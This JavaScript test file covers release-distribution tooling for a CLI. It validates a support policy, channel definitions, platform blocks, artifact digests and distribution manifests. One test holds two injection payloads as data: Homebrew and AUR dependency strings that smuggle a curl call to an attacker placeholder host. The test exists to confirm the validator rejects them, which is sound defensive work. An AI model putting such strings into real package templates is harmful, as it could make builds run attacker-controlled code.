import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { cp, mkdir, readFile, writeFile } from "node:fs/promises";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";

import {
  CHANNEL_ORDER,
  channelDefinitionsFromSupportPolicy,
  validateDistributionManifest,
  validateSupportPolicy,
  verifyDistributionInputs,
} from "../scripts/release-distribution-lib.mjs";
import { sha256File } from "../scripts/lib/release-evidence.mjs";
import { syntheticReleaseEnvelope, syntheticReleaseInputs } from "../scripts/lib/release-test-fixture.mjs";
import { TestResourceLedger } from "./support/test-resource-ledger.mjs";

const execute = promisify(execFile);
const repositoryRoot = path.resolve(fileURLToPath(new URL("..", import.meta.url)));
const node = process.execPath;
const resources = new TestResourceLedger();
const sourcePolicy = JSON.parse(
  await readFile(path.join(repositoryRoot, "packaging", "support-policy.json"), "utf8"),
);

test.after(() => resources.cleanup());

function clone(value) {
  return structuredClone(value);
}

async function createFixture() {
  const root = await resources.createTempDirectory("cuna-support-policy-authority-");
  const evidence = path.join(root, "evidence");
  const distributions = path.join(root, "distributions");
  await mkdir(evidence, { recursive: true });

  const version = "1.2.3-preview.1";
  const sourceCommit = "a".repeat(40);
  const tarballFile = "cuna_labs-cli-1.2.3-preview.1.tgz";
  await writeFile(path.join(evidence, tarballFile), "immutable candidate bytes\n");
  const sbom = {
    bomFormat: "CycloneDX",
    specVersion: "1.6",
    version: 1,
    metadata: {
      component: {
        type: "application",
        name: "@cuna_labs/cli",
        version,
        purl: `pkg:npm/%40cuna_labs/cli@${version}`,
        "bom-ref": `@cuna_labs/cli@${version}`,
      },
    },
    components: [],
  };
  await writeFile(path.join(evidence, "sbom.cdx.json"), `${JSON.stringify(sbom)}\n`);
  await cp(
    path.join(repositoryRoot, "packaging", "support-policy.json"),
    path.join(evidence, "support-policy.json"),
  );

  const releaseInputs = syntheticReleaseInputs({ version, sourceCommit });
  await writeFile(path.join(evidence, "release-inputs.json"), `${JSON.stringify(releaseInputs)}\n`);
  const envelope = syntheticReleaseEnvelope({
    version,
    sourceCommit,
    tarball: {
      file: tarballFile,
      url: `https://registry.npmjs.org/@cuna_labs/cli/-/cli-${version}.tgz`,
      sha256: await sha256File(path.join(evidence, tarballFile)),
      size: (await readFile(path.join(evidence, tarballFile))).length,
    },
    sbom: {
      file: "sbom.cdx.json",
      sha256: await sha256File(path.join(evidence, "sbom.cdx.json")),
    },
    supportPolicy: {
      file: "support-policy.json",
      sha256: await sha256File(path.join(evidence, "support-policy.json")),
    },
    releaseInputs,
    releaseInputsSha256: await sha256File(path.join(evidence, "release-inputs.json")),
  });
  await writeFile(
    path.join(evidence, "release-envelope.json"),
    `${JSON.stringify(envelope, null, 2)}\n`,
  );
  return { evidence, distributions, envelope };
}

async function project(fixture) {
  await execute(node, [
    "scripts/release-project-distributions.mjs",
    "--root", repositoryRoot,
    "--evidence", fixture.evidence,
    "--output", fixture.distributions,
  ], { cwd: repositoryRoot, maxBuffer: 4 * 1024 * 1024 });
  return JSON.parse(
    await readFile(path.join(fixture.distributions, "distribution-manifest.json"), "utf8"),
  );
}

test("support policy is the sole ordered authority for every approved distribution channel", () => {
  const supportedPlatforms = validateSupportPolicy(sourcePolicy);
  const definitions = channelDefinitionsFromSupportPolicy(sourcePolicy);

  assert.deepEqual(Object.keys(definitions), CHANNEL_ORDER);
  assert.deepEqual(supportedPlatforms, ["darwin-x64", "linux-x64", "win32-x64"]);
  for (const id of CHANNEL_ORDER) {
    assert.deepEqual(definitions[id], sourcePolicy.channels[id]);
    assert.ok(Object.hasOwn(definitions[id], "artifactChannel"));
    assert.ok(Object.hasOwn(definitions[id], "installerOfRecord"));
  }

  assert.equal(definitions.bun.artifactChannel, "npm");
  assert.equal(definitions.bun.installerOfRecord, "bun");
  assert.notEqual(definitions.bun.artifactChannel, definitions.bun.installerOfRecord);
  assert.deepEqual(definitions.bun.platforms, ["linux-x64", "darwin-x64"]);
  assert.equal(definitions.bun.blockedPlatforms.length, 1);
  assert.equal(definitions.bun.blockedPlatforms[0].platform, "win32-x64");
  assert.equal(definitions.bun.blockedPlatforms[0].reasonCode, "BUN_WINDOWS_GLOBAL_UNINSTALL_LEAVES_SHIMS");
  assert.equal(definitions.bun.blockedPlatforms[0].fallbackChannel, "npm");
  assert.ok(definitions.npm.platforms.includes("win32-x64"));
});

test("Bun Windows stays explicitly blocked until clean package-manager cleanup is re-proven", () => {
  const missingBlock = clone(sourcePolicy);
  missingBlock.channels.bun.blockedPlatforms = [];
  assert.throws(
    () => validateSupportPolicy(missingBlock),
    /Bun Windows block differs from the verified upstream defect and re-admission gate/,
  );

  const ambiguous = clone(sourcePolicy);
  ambiguous.channels.bun.platforms.push("win32-x64");
  assert.throws(
    () => validateSupportPolicy(ambiguous),
    /cannot be both supported and blocked/,
  );

  const unsafeFallback = clone(sourcePolicy);
  unsafeFallback.channels.bun.blockedPlatforms[0].fallbackChannel = "curl";
  assert.throws(
    () => validateSupportPolicy(unsafeFallback),
    /blocked platform fallback does not support win32-x64/,
  );
});

test("an independent policy mutation is rejected unless the release envelope is rebound", async () => {
  const fixture = await createFixture();
  const policyFile = path.join(fixture.evidence, "support-policy.json");
  const policy = JSON.parse(await readFile(policyFile, "utf8"));
  policy.channels.bun.role = "unapproved-independent-role";
  await writeFile(policyFile, `${JSON.stringify(policy, null, 2)}\n`);

  await assert.rejects(
    verifyDistributionInputs(fixture.envelope, fixture.evidence),
    /Support-policy digest mismatch/,
  );
});

test("missing and unknown channel identities are rejected", () => {
  const missing = clone(sourcePolicy);
  delete missing.channels.aur;
  assert.throws(
    () => validateSupportPolicy(missing),
    /support policy channels keys differ/,
  );

  const unknown = clone(sourcePolicy);
  unknown.channels.rogue = clone(unknown.channels.npm);
  assert.throws(
    () => validateSupportPolicy(unknown),
    /support policy channels keys differ/,
  );

  const reordered = clone(sourcePolicy);
  reordered.channelOrder = ["bun", "npm", "curl", "homebrew", "aur"];
  assert.deepEqual(channelDefinitionsFromSupportPolicy(reordered).bun, sourcePolicy.channels.bun);
});

test("unsupported architecture and channel platform claims are rejected", () => {
  const architecture = clone(sourcePolicy);
  architecture.architectures = ["x64"];
  assert.throws(
    () => validateSupportPolicy(architecture),
    /package architecture claim differs from the architecture-neutral runtime closure/,
  );

  const platform = clone(sourcePolicy);
  platform.channels.bun.platforms.push("darwin-arm64");
  assert.throws(
    () => validateSupportPolicy(platform),
    /bun claims unsupported platform darwin-arm64/,
  );
});

test("every mandatory platform covers every declared Node line", () => {
  const missingDarwinNode = clone(sourcePolicy);
  missingDarwinNode.ciMatrix = missingDarwinNode.ciMatrix.filter((entry) => entry.id !== "macos-15-intel-node22-x64");
  assert.throws(
    () => validateSupportPolicy(missingDarwinNode),
    /lacks mandatory darwin-x64 coverage for Node 22\.17\.1/,
  );
});

test("every Tier-1 platform observes arm64 on every declared Node line without widening admission", () => {
  const missingObservation = clone(sourcePolicy);
  missingObservation.ciMatrix = missingObservation.ciMatrix.filter(
    (entry) => entry.id !== "windows-11-node24-arm64-observation",
  );
  assert.throws(
    () => validateSupportPolicy(missingObservation),
    /lacks non-authorizing win32-arm64 observation for Node 24\.4\.1/u,
  );
  assert.deepEqual(
    validateSupportPolicy(sourcePolicy),
    ["darwin-x64", "linux-x64", "win32-x64"],
  );
});

test("roles and executable-template dependencies reject injection syntax", () => {
  const role = clone(sourcePolicy);
  role.channels.npm.role = "garbage";
  assert.throws(() => validateSupportPolicy(role), /npm role is unknown/);

  const swappedRoles = clone(sourcePolicy);
  [swappedRoles.channels.npm.role, swappedRoles.channels.bun.role] = [swappedRoles.channels.bun.role, swappedRoles.channels.npm.role];
  assert.throws(() => validateSupportPolicy(swappedRoles), /npm role violates its channel contract/);

  const installer = clone(sourcePolicy);
  installer.channels.npm.installerOfRecord = "pacman";
  assert.throws(() => validateSupportPolicy(installer), /npm installer-of-record violates its channel contract/);

  for (const [id, payload] of [
    ["homebrew", 'node@22"\nsystem "curl", "https://attacker.invalid"'],
    ["aur", "nodejs-lts-jod>=22.17.1')\nprepare(){ curl attacker.invalid; }\n#"],
  ]) {
    const policy = clone(sourcePolicy);
    policy.channels[id].runtimeDependency = payload;
    assert.throws(() => validateSupportPolicy(policy), new RegExp(`${id} runtime dependency is unsafe`, "i"));
  }
});

test("pre-publication availability and canonical artifact identity cannot drift in policy", () => {
  const availability = clone(sourcePolicy);
  availability.channels.npm.availability = "LIVE";
  assert.throws(
    () => validateSupportPolicy(availability),
    /npm may not claim live availability in the pre-publication policy/,
  );

  const artifact = clone(sourcePolicy);
  artifact.channels.bun.artifactChannel = "bun";
  assert.throws(
    () => validateSupportPolicy(artifact),
    /bun must resolve the canonical npm artifact/,
  );
});

test("a manifest cannot drift from its bound policy role, availability, installer, or artifact identity", async (t) => {
  const fixture = await createFixture();
  const manifest = await project(fixture);
  const definitions = channelDefinitionsFromSupportPolicy(sourcePolicy);
  assert.doesNotThrow(() => validateDistributionManifest(manifest, fixture.envelope, definitions));

  const mutations = [
    {
      name: "role",
      mutate(candidate) { candidate.channels.find(({ id }) => id === "bun").role = "registry-alias"; },
      expected: /bun role mismatch/,
    },
    {
      name: "availability",
      mutate(candidate) { candidate.channels.find(({ id }) => id === "bun").availability = "LIVE"; },
      expected: /bun may not claim live availability outside the bound support policy/,
    },
    {
      name: "installer of record",
      mutate(candidate) { candidate.channels.find(({ id }) => id === "bun").installerOfRecord = "npm"; },
      expected: /bun installer-of-record mismatch/,
    },
    {
      name: "artifact channel",
      mutate(candidate) { candidate.channels.find(({ id }) => id === "bun").artifactChannel = "bun"; },
      expected: /bun artifact-channel mismatch/,
    },
    {
      name: "candidate artifact digest",
      mutate(candidate) { candidate.channels.find(({ id }) => id === "bun").artifactSha256 = "f".repeat(64); },
      expected: /bun does not bind the candidate tarball/,
    },
    {
      name: "blocked platform",
      mutate(candidate) { candidate.channels.find(({ id }) => id === "bun").blockedPlatforms[0].fallbackChannel = "curl"; },
      expected: /bun blocked-platform claim mismatch/,
    },
  ];

  for (const { name, mutate, expected } of mutations) {
    await t.test(name, () => {
      const candidate = clone(manifest);
      mutate(candidate);
      assert.throws(
        () => validateDistributionManifest(candidate, fixture.envelope, definitions),
        expected,
      );
    });
  }
});

test("artifact channel and installer of record remain independently required identities", async () => {
  const fixture = await createFixture();
  const manifest = await project(fixture);
  const definitions = channelDefinitionsFromSupportPolicy(sourcePolicy);
  const bun = manifest.channels.find(({ id }) => id === "bun");

  assert.equal(bun.artifactChannel, "npm");
  assert.equal(bun.installerOfRecord, "bun");
  assert.notEqual(bun.artifactChannel, bun.installerOfRecord);

  const missingArtifactChannel = clone(manifest);
  delete missingArtifactChannel.channels.find(({ id }) => id === "bun").artifactChannel;
  assert.throws(
    () => validateDistributionManifest(missingArtifactChannel, fixture.envelope, definitions),
    /channel bun keys differ/,
  );

  const missingInstaller = clone(manifest);
  delete missingInstaller.channels.find(({ id }) => id === "bun").installerOfRecord;
  assert.throws(
    () => validateDistributionManifest(missingInstaller, fixture.envelope, definitions),
    /channel bun keys differ/,
  );
});

test("mutable public commands cannot impersonate candidate-bound projection invocations", async () => {
  const fixture = await createFixture();
  const manifest = await project(fixture);
  const definitions = channelDefinitionsFromSupportPolicy(sourcePolicy);
  for (const id of ["curl", "homebrew", "aur"]) {
    const channel = manifest.channels.find((entry) => entry.id === id);
    assert.notEqual(channel.candidateInvocation, channel.publicCommand);
    const mutated = clone(manifest);
    mutated.channels.find((entry) => entry.id === id).candidateInvocation = channel.publicCommand;
    assert.throws(
      () => validateDistributionManifest(mutated, fixture.envelope, definitions),
      new RegExp(`${id} candidate invocation mismatch`),
    );
  }
});
